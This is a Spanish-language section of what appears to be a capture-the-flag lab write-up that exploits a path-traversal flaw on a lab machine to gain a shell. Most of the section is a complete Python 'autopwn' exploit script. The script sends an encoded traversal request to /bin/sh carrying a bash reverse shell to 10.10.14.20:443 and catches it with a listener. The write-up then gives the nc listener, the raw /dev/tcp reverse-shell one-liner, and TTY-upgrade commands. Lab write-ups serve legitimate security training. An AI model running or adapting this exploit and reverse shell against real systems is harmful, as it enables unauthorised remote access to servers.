## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Autopwn.py {-}

```python
#!/usr/bin/python3

import requests
import sys
import signal
import pdb
import threading
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.165/.%0d./.%0d./.%0d./.%0d./bin/sh"
lport = 443

def makeRequest():

    data_post = {
        b'bash -c "bash -i >& /dev/tcp/10.10.14.20/443 0>&1"'
    }

    r = requests.post(main_url, data=data_post)

if __name__ == '__main__':

    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    p1 = log.progress("Acceso")
    p1.status("Ganando acceso al sistema")

    shell = listen(lport, timeout=5).wait_for_connection()

    if shell.sock is None:
        p1.failure("No ha sido posible ganar acceso al sistema")
        sys.exit(1)
    else:
        shell.interactive()
```

Lo ejecutamos

```bash
python autopwn.py
whoami
#Output
www-data

ifconfig
```

El tito prefiere entablarse una shell normal. Se pone en escucha con `nc -nlvp 443` y lanza en la shell creado por el script
`bash -i >& /dev/tcp/10.10.14.20/443 0>&1`

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <numero filas> columns <numero columnas>
```

